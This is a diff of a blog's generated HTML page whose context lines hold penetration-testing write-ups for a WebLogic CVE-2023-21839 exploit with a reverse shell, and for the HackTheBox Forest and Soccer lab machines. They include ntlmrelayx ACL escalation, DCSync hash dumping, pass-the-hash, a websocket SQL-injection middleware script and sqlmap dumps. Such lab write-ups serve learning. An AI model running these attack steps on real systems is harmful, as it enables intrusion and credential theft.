@@ -117,24 +117,9 @@
     <a href="/" rel="section"><i class="fa fa-home fa-fw"></i>首页</a>
 
   </li>
-        <li class="menu-item menu-item-tags">
-
-    <a href="/tags/" rel="section"><i class="fa fa-tags fa-fw"></i>标签</a>
-
-  </li>
-        <li class="menu-item menu-item-categories">
-
-    <a href="/categories/" rel="section"><i class="fa fa-th fa-fw"></i>分类</a>
-
-  </li>
         <li class="menu-item menu-item-archives">
 
     <a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>归档</a>
-
-  </li>
-        <li class="menu-item menu-item-sitemap">
-
-    <a href="/sitemap.xml" rel="section"><i class="fa fa-sitemap fa-fw"></i>站点地图</a>
 
   </li>
       <li class="menu-item menu-item-search">
@@ -222,7 +207,7 @@
                   <i class="far fa-calendar-check"></i>
                 </span>
                 <span class="post-meta-item-text">更新于</span>
-                <time title="修改时间：2023-04-09 10:44:24" itemprop="dateModified" datetime="2023-04-09T10:44:24+08:00">2023-04-09</time>
+                <time title="修改时间：2024-09-27 21:02:10" itemprop="dateModified" datetime="2024-09-27T21:02:10+08:00">2024-09-27</time>
               </span>
 
           
@@ -250,29 +235,29 @@
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">nmap -sC -sV  -p7001 127.0.0.1                     #本地搭建ip为127.0.0.1</span><br><span class="line">PORT     STATE SERVICE VERSION</span><br><span class="line">7001/tcp open  http    Oracle WebLogic admin httpd 12.2.1.3 (T3 enabled)</span><br><span class="line">|_http-title: Error 404--Not Found</span><br><span class="line">|_weblogic-t3-info: T3 protocol in use (WebLogic version: 12.2.1.3)</span><br><span class="line"></span><br><span class="line">Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .</span><br><span class="line">Nmap done: 1 IP address (1 host up) scanned in 11.60 seconds</span><br></pre></td></tr></table></figure>
 
 <p>访问<strong>console</strong>目录，发现存在<strong><a target="_blank" rel="noopener" href="http://x.x.x.x:7001/console/login/LoginForm.jsp">http://x.x.x.x:7001/console/login/LoginForm.jsp</a></strong></p>
-<img src="/undefined/undefined/image-20230324111102786.png" class="">
+<img src="/undefined/6c59522f/image-20230324111102786.png" class="">
 
 <p>3）exploit测试：</p>
 <p><a target="_blank" rel="noopener" href="https://github.com/4ra1n/CVE-2023-21839">https://github.com/4ra1n/CVE-2023-21839</a></p>
 <p>下载到本地后，在cmd目录下，编译go文件</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">windows: </span><br><span class="line">go build -o CVE-2023-21839.exe</span><br><span class="line"></span><br><span class="line">linux:</span><br><span class="line">go build -o CVE-2023-21839</span><br></pre></td></tr></table></figure>
 
-<img src="/undefined/undefined/image-20230324110857878.png" class="">
+<img src="/undefined/6c59522f/image-20230324110857878.png" class="">
 
 
 <p>i. 利用dnslog进行探测发现存在漏洞</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./CVE-2023-21839 -ip 192.168.0.234 -port 7001 -ldap ldap://licajd.dnslog.cn</span><br></pre></td></tr></table></figure>
 
-<img src="/undefined/undefined/image-20230324110940041.png" class="">
+<img src="/undefined/6c59522f/image-20230324110940041.png" class="">
 
 <p>ii.反弹shell</p>
 <p>JNDI利用工具<a target="_blank" rel="noopener" href="https://github.com/WhiteHSBG/JNDIExploit">https://github.com/WhiteHSBG/JNDIExploit</a></p>
 <pre><code> 本地反弹成功
 </code></pre>
-<img src="/undefined/undefined/image-20230324111608588.png" class="">
+<img src="/undefined/6c59522f/image-20230324111608588.png" class="">
 
 <p> 反弹vps成功</p>
-<img src="/undefined/undefined/image-20230324111758611.png" class="">
+<img src="/undefined/6c59522f/image-20230324111758611.png" class="">
       
     </div>
 
@@ -314,10 +299,16 @@
                 <i class="far fa-calendar"></i>
               </span>
               <span class="post-meta-item-text">发表于</span>
-              
 
-              <time title="创建时间：2023-03-12 22:02:28 / 修改时间：22:11:13" itemprop="dateCreated datePublished" datetime="2023-03-12T22:02:28+08:00">2023-03-12</time>
+              <time title="创建时间：2023-03-12 22:02:28" itemprop="dateCreated datePublished" datetime="2023-03-12T22:02:28+08:00">2023-03-12</time>
             </span>
+              <span class="post-meta-item">
+                <span class="post-meta-item-icon">
+                  <i class="far fa-calendar-check"></i>
+                </span>
+                <span class="post-meta-item-text">更新于</span>
+                <time title="修改时间：2024-09-27 21:02:10" itemprop="dateModified" datetime="2024-09-27T21:02:10+08:00">2024-09-27</time>
+              </span>
 
           
 
@@ -330,7 +321,7 @@
     <div class="post-body" itemprop="articleBody">
 
       
-          <h1 id="Forest"><a href="#Forest" class="headerlink" title="Forest"></a>Forest</h1><h2 id="Box-info"><a href="#Box-info" class="headerlink" title="Box info"></a>Box info</h2><img src="/undefined/undefined/image-20230312205222691.png" class="">
+          <h1 id="Forest"><a href="#Forest" class="headerlink" title="Forest"></a>Forest</h1><h2 id="Box-info"><a href="#Box-info" class="headerlink" title="Box info"></a>Box info</h2><img src="/undefined/a7f75ca4/image-20230312205222691.png" class="">
 
 <h2 id="Recon"><a href="#Recon" class="headerlink" title="Recon"></a>Recon</h2><h3 id="nmap"><a href="#nmap" class="headerlink" title="nmap"></a>nmap</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap -sT -sC -sV -O -p 53,135,139,389,445,593,3268,47001 10.10.10.161</span><br></pre></td></tr></table></figure>
 
@@ -375,14 +366,14 @@
 
 <h3 id="getshell"><a href="#getshell" class="headerlink" title="getshell"></a>getshell</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">┌──(sollupus㉿kali)-[~/RedTeamNote/Walkthrough/Forest]</span><br><span class="line">└─$ evil-winrm -i 10.10.10.161 -u svc-alfresco@HTB.LOCAL</span><br></pre></td></tr></table></figure>
 
-<img src="/undefined/undefined/image-20230312212800728.png" class="">
+<img src="/undefined/a7f75ca4/image-20230312212800728.png" class="">
 
 <h2 id="Privesc-to-Administrator"><a href="#Privesc-to-Administrator" class="headerlink" title="Privesc to Administrator"></a>Privesc to Administrator</h2><h3 id="Enumeration"><a href="#Enumeration" class="headerlink" title="Enumeration"></a>Enumeration</h3><h4 id="Sharphound"><a href="#Sharphound" class="headerlink" title="Sharphound"></a>Sharphound</h4><p>With shell,we can use sharphound.exe to collect information for Bloodhound.</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">*Evil-WinRM* PS C:\Users\svc-alfresco\Desktop&gt; upload /home/sollupus/RedTeamNote/WeaponizingTools/Domain-penetration/Tools/Sharphood/SharpHound.exe c:\tmp\sharp.exe</span><br></pre></td></tr></table></figure>
 
-<img src="/undefined/undefined/image-20230312213156062.png" class="">
+<img src="/undefined/a7f75ca4/image-20230312213156062.png" class="">
 
-<img src="/undefined/undefined/image-20230312213327732.png" class="">
+<img src="/undefined/a7f75ca4/image-20230312213327732.png" class="">
 
 <p>Then get it to local machine.I use smbserver to get that target.</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">┌──(sollupus㉿kali)-[~/…/WeaponizingTools/Domain-penetration/impacket/examples]</span><br><span class="line">└─$ ./smbserver.py share /home/sollupus/RedTeamNote/Walkthrough/Forest -smb2support -username a -password a</span><br></pre></td></tr></table></figure>
@@ -390,27 +381,27 @@
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">*Evil-WinRM* PS C:\tmp&gt;net use \\10.10.16.8\share /u:a a</span><br><span class="line">*Evil-WinRM* PS C:\tmp&gt;copy 20230312045852_BloodHound.zip \\10.10.16.8\share\</span><br><span class="line">*Evil-WinRM* PS C:\tmp&gt;del 20230312045852_BloodHound.zip</span><br><span class="line">*Evil-WinRM* PS C:\tmp&gt;net use /d \\10.10.16.8\share</span><br></pre></td></tr></table></figure>
 
 <p>Then upload it to BloodHound.And use that quey to find the shortest way from owner to administrator.</p>
-<img src="/undefined/undefined/image-20230312213915439.png" class="">
+<img src="/undefined/a7f75ca4/image-20230312213915439.png" class="">
 
 <p>With that graph,we can know owner is belong to group <code>EXCHANGE WINDOWS PERMISSIONS@HTB.LOCAL</code>,which means that you have privilege to modify domain ACL.</p>
 <h3 id="NTLM-relay"><a href="#NTLM-relay" class="headerlink" title="NTLM-relay"></a>NTLM-relay</h3><p>1.Firstly, add <code>svc-alfresco</code> to group <code>Exchange Windows Permissions</code>.</p>
-<img src="/undefined/undefined/image-20230312214603499.png" class="">
+<img src="/undefined/a7f75ca4/image-20230312214603499.png" class="">
 
 
 
 <p>2.Then Run the <code>ntlmrelayx.py</code> man-in-the-middle (“mitm”) tool with the <code>--escalate-user</code> flag. What this will essentially do is when it identifies the login  attempt of the “svc-alfresco” user on the same network, it will mitm to  automatically check the user privileges, and if it can modify the domain ACL, it will modify the user permissions to add <code>Replication-Get-Changes-All</code> privileges to the user account, which can do a DCSync.</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">┌──(sollupus㉿kali)-[~/…/WeaponizingTools/Domain-penetration/impacket/examples]</span><br><span class="line">└─$ ./ntlmrelayx.py -t ldap://10.10.10.161 --escalate-user svc-alfresco </span><br></pre></td></tr></table></figure>
 
-<img src="/undefined/undefined/image-20230312214801416.png" class="">
+<img src="/undefined/a7f75ca4/image-20230312214801416.png" class="">
 
 <p>3.Then, we will do a random authentication using the <code>svc-alfresco</code>  account. In this case, I used <code>psexec.py</code> to do an authenticate attempt against my own Kali box.</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">┌──(sollupus㉿kali)-[~/…/WeaponizingTools/Domain-penetration/impacket/examples]</span><br><span class="line">└─$ ./psexec.py htb.local/svc-alfresco:s3rvice@10.10.16.8</span><br></pre></td></tr></table></figure>
-<img src="/undefined/undefined/image-20230312215108184.png" class="">
+<img src="/undefined/a7f75ca4/image-20230312215108184.png" class="">
 
 <p>​	Obviously,<code>psexec.py</code> will failed because there is no smb server runing in my kali box.However,<code>ntlmrelayx.py</code> will capture authentication attempt of the <code>htb.local/svc-alfresco</code> to the <code>ldap://10.10.10.161</code>.And since it is valid credentials to the Forces box, it will successfully authenticate and escalate our privileges to add <code>Replication-Get-Changes-All</code>.</p>
 <h3 id="DCSync"><a href="#DCSync" class="headerlink" title="DCSync"></a>DCSync</h3><p>Then we can use <code>secretdump.py</code> to dump the Administrator’s NTML hash.</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">┌──(sollupus㉿kali)-[~/…/WeaponizingTools/Domain-penetration/impacket/examples]</span><br><span class="line">└─$ ./secretsdump.py htb.local/svc-alfresco:s3rvice@10.10.10.161</span><br></pre></td></tr></table></figure>
-<img src="/undefined/undefined/image-20230312215522843.png" class="">
+<img src="/undefined/a7f75ca4/image-20230312215522843.png" class="">
 
 <p>Then use evil-winrm ,we can connect to forest box as Administrator.</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">┌──(sollupus㉿kali)-[~/…/WeaponizingTools/Domain-penetration/impacket/examples]</span><br><span class="line">└─$ evil-winrm -i 10.10.10.161 -u Administrator -H 32693b11e6aa90eb43d32c72a07ceea6 </span><br></pre></td></tr></table></figure>
@@ -458,10 +449,16 @@
                 <i class="far fa-calendar"></i>
               </span>
               <span class="post-meta-item-text">发表于</span>
-              
 
-              <time title="创建时间：2023-03-07 21:17:30 / 修改时间：21:22:34" itemprop="dateCreated datePublished" datetime="2023-03-07T21:17:30+08:00">2023-03-07</time>
+              <time title="创建时间：2023-03-07 21:17:30" itemprop="dateCreated datePublished" datetime="2023-03-07T21:17:30+08:00">2023-03-07</time>
             </span>
+              <span class="post-meta-item">
+                <span class="post-meta-item-icon">
+                  <i class="far fa-calendar-check"></i>
+                </span>
+                <span class="post-meta-item-text">更新于</span>
+                <time title="修改时间：2024-09-27 21:02:10" itemprop="dateModified" datetime="2024-09-27T21:02:10+08:00">2024-09-27</time>
+              </span>
 
           
 
@@ -487,33 +484,33 @@
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">echo &quot;10.10.14.9 soccer.htb&quot; |sudo tee -a /etc/hosts</span><br></pre></td></tr></table></figure>
 
 <p>Then we can get to soccer.htb website.</p>
-<img src="/undefined/undefined/1.png" class="">
+<img src="/undefined/236928b6/1.png" class="">
 
 <p>​	Then website enumration</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gobuster dir -u http://soccer.htb/ -w  /usr/share/seclists/Discovery/Web-Content/big.txt</span><br></pre></td></tr></table></figure>
 
-<img src="/undefined/undefined/image-20230307195637576.png" class="">
+<img src="/undefined/236928b6/image-20230307195637576.png" class="">
 
 <p>We get such a result that show a  interesting things like de sub directory <code>/tiny</code>.So we try to get to it.</p>
-<img src="/undefined/undefined/image-20230307200117180.png" class="">
+<img src="/undefined/236928b6/image-20230307200117180.png" class="">
 
 <p>From this page,we can find that there is a link and a title that names tiny file manager.Go to that link, we can find a default username and password for this manager.So try it.</p>
-<img src="/undefined/undefined/image-20230307200431670.png" class="">
+<img src="/undefined/236928b6/image-20230307200431670.png" class="">
 
 <p>Using admin&#x2F;admin@123,we can login into it as admin.</p>
-<img src="/undefined/undefined/image-20230307200949744.png" class="">
+<img src="/undefined/236928b6/image-20230307200949744.png" class="">
 
 <p>And we can upload files without filtering.Then we can get a shell to the target as www-data user.</p>
-<img src="/undefined/undefined/image-20230307201721218.png" class="">
+<img src="/undefined/236928b6/image-20230307201721218.png" class="">
 
 <p>Then ,in the <code>/etc/nginx/site-enabled</code> folder ,we can find a file named <code>soc-player.htb</code>. And that file contains a subdomain <code>soc-player.soccer.htb</code>.So we add it to our &#x2F;etc&#x2F;hosts.</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">echo &quot;10.10.11.194 soc-player.soccer.htb&quot;|sudo tee -a /etc/hosts</span><br></pre></td></tr></table></figure>
 
 <p>Then visit it .And there is something more like login,signup and match.</p>
-<img src="/undefined/undefined/image-20230307202435641.png" class="">
+<img src="/undefined/236928b6/image-20230307202435641.png" class="">
 
 <p>After signing up and login,ticket page shows.On Viewing the source code, we get to know that this field is connected to the Web socket</p>
-<img src="/undefined/undefined/image-20230307202958737.png" class="">
+<img src="/undefined/236928b6/image-20230307202958737.png" class="">
 
 <p>And we found that socket can be vulnerable to blind SQL injection and sqlmap has ws protocol support.With belowing code from this link <a target="_blank" rel="noopener" href="https://rayhan0x01.github.io/ctf/2021/04/02/blind-sqli-over-websocket-automation.html">https://rayhan0x01.github.io/ctf/2021/04/02/blind-sqli-over-websocket-automation.html</a>, we can use sqlmap to injection thorough that websocket.</p>
 <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> http.server <span class="keyword">import</span> SimpleHTTPRequestHandler</span><br><span class="line"><span class="keyword">from</span> socketserver <span class="keyword">import</span> TCPServer</span><br><span class="line"><span class="keyword">from</span> urllib.parse <span class="keyword">import</span> unquote,urlparse</span><br><span class="line"><span class="keyword">from</span> websocket <span class="keyword">import</span> create_connenction</span><br><span class="line"></span><br><span class="line"><span class="comment">#sqlmap nodejs websocket</span></span><br><span class="line"></span><br><span class="line">ws_server = <span class="string">&quot;ws://soc-player.soccer.htb:9091&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">send_ws</span>(<span class="params">payload</span>):</span><br><span class="line">    ws = create_connenction(ws_server)</span><br><span class="line">    message =  unquote(payload).replace(<span class="string">&#x27;&quot;&#x27;</span>,<span class="string">&quot;\&#x27;&quot;</span>)</span><br><span class="line">    data = <span class="string">&#x27;&#123;&quot;id&quot;:&quot;%s&quot;&#125;&#x27;</span>%message</span><br><span class="line">    ws.send(data)</span><br><span class="line">    resp = ws.recv()</span><br><span class="line">    ws.close()</span><br><span class="line">    <span class="keyword">if</span> resp:</span><br><span class="line">        <span class="keyword">return</span> resp</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&#x27;&#x27;</span></span><br><span class="line">    </span><br><span class="line"><span class="keyword">def</span> <span class="title function_">middleware_server</span>(<span class="params">host_post,content_type=<span class="string">&#x27;text/plain&#x27;</span></span>):</span><br><span class="line">    <span class="keyword">class</span> <span class="title class_">CustomHandler</span>(<span class="title class_ inherited__">SimpleHTTPRequestHandler</span>):</span><br><span class="line">        <span class="keyword">def</span> <span class="title function_">do_GET</span>(<span class="params">self</span>) -&gt; <span class="literal">None</span>:</span><br><span class="line">            self.send_response(<span class="number">200</span>)</span><br><span class="line">            <span class="keyword">try</span>:</span><br><span class="line">                payload = urlparse(self.path).query.split(<span class="string">&quot;=&quot;</span>,<span class="number">1</span>)[<span class="number">1</span>]</span><br><span class="line">            <span class="keyword">except</span> IndexError:</span><br><span class="line">                payload=<span class="literal">False</span></span><br><span class="line">            <span class="keyword">if</span> payload:</span><br><span class="line">                content = send_ws(payload)</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                content = <span class="string">&quot;None&quot;</span></span><br><span class="line">            self.send_header(<span class="string">&quot;Content-type&quot;</span>,content_type)</span><br><span class="line">            self.end_headers()</span><br><span class="line">            self.wfile.write(content.encode())</span><br><span class="line">            <span class="keyword">return</span></span><br><span class="line">    <span class="keyword">class</span> <span class="title class_">_TCPServer</span>(<span class="title class_ inherited__">TCPServer</span>):</span><br><span class="line">        allow_reuse_address = <span class="literal">True</span></span><br><span class="line">        httpd = TCPServer(host_post,CustomHandler)</span><br><span class="line">        httpd.serve_forever()</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;[+] Starting MiddleWare Server&quot;</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;[+] Send payloads in http://localhost:8081/?id=*&quot;</span>)</span><br><span class="line">    </span><br><span class="line"><span class="keyword">try</span>:</span><br><span class="line">    middleware_server((<span class="string">&#x27;0.0.0.0&#x27;</span>,<span class="number">8081</span>))</span><br><span class="line"><span class="keyword">except</span> KeyboardInterrupt:</span><br><span class="line">    <span class="keyword">pass</span></span><br></pre></td></tr></table></figure>
@@ -521,11 +518,11 @@
 <p>Run the exploit and use sqlmap</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">python3 exploit.py</span><br><span class="line"></span><br><span class="line">sqlmap -u &quot;http://localhost:8081/?id=1&quot;</span><br><span class="line">sqlmap -u &quot;http://localhost:8081/?id=1&quot; --current-db</span><br><span class="line">sqlmap -u &quot;http://localhost:8081/?id=1&quot; -D soccer_db --tables</span><br><span class="line">sqlmap -u &quot;http://localhost:8081/?id=1&quot; -D soccer_db -T accounts --dump</span><br></pre></td></tr></table></figure>
 
-<img src="/undefined/undefined/image-20230307203614900.png" class="">
+<img src="/undefined/236928b6/image-20230307203614900.png" class="">
 
 <p>we can ssh into the machine with these credentials.</p>
 <p>Then using linpeas.sh to enumration.</p>
-<img src="/undefined/undefined/image-20230307204636499.png" class="">
+<img src="/undefined/236928b6/image-20230307204636499.png" class="">
 
 <blockquote>
 <p>The <code>doas</code> utility executes the given command as another user. The command argument is mandatory unless <code>-C*</code>, <code>-L, or </code>-s&#96; is specified.</p>
@@ -534,7 +531,7 @@
 <p>And what is dstat.<a target="_blank" rel="noopener" href="https://linux.die.net/man/1/dstat">https://linux.die.net/man/1/dstat</a></p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">find / -name dstat -type d 2&gt;/dev/null</span><br></pre></td></tr></table></figure>
 
-<img src="/undefined/undefined/image-20230307204815081.png" class="">
+<img src="/undefined/236928b6/image-20230307204815081.png" class="">
 
 <p>then we can make a reverse_shell in dstat_rev.py to the &#x2F;usr&#x2F;local&#x2F;share&#x2F;dstat directory.</p>
 <p>And use doas ,we can get root shell.</p>
@@ -590,7 +587,7 @@
                   <i class="far fa-calendar-check"></i>
                 </span>
                 <span class="post-meta-item-text">更新于</span>
-                <time title="修改时间：2023-03-07 21:16:50" itemprop="dateModified" datetime="2023-03-07T21:16:50+08:00">2023-03-07</time>
+                <time title="修改时间：2024-09-27 21:02:10" itemprop="dateModified" datetime="2024-09-27T21:02:10+08:00">2024-09-27</time>
               </span>
 
           
@@ -695,7 +692,7 @@
                   <i class="far fa-calendar-check"></i>
                 </span>
                 <span class="post-meta-item-text">更新于</span>
-                <time title="修改时间：2023-03-06 22:04:53" itemprop="dateModified" datetime="2023-03-06T22:04:53+08:00">2023-03-06</time>
+                <time title="修改时间：2024-09-27 21:02:10" itemprop="dateModified" datetime="2024-09-27T21:02:10+08:00">2024-09-27</time>
               </span>
 
           
@@ -806,10 +803,16 @@
                 <i class="far fa-calendar"></i>
               </span>
               <span class="post-meta-item-text">发表于</span>
-              
 
-              <time title="创建时间：2022-09-28 21:19:19 / 修改时间：21:22:30" itemprop="dateCreated datePublished" datetime="2022-09-28T21:19:19+08:00">2022-09-28</time>
+              <time title="创建时间：2022-09-28 21:19:19" itemprop="dateCreated datePublished" datetime="2022-09-28T21:19:19+08:00">2022-09-28</time>
             </span>
+              <span class="post-meta-item">
+                <span class="post-meta-item-icon">
+                  <i class="far fa-calendar-check"></i>
+                </span>
+                <span class="post-meta-item-text">更新于</span>
+                <time title="修改时间：2024-09-27 21:02:10" itemprop="dateModified" datetime="2024-09-27T21:02:10+08:00">2024-09-27</time>
+              </span>
 
           
 
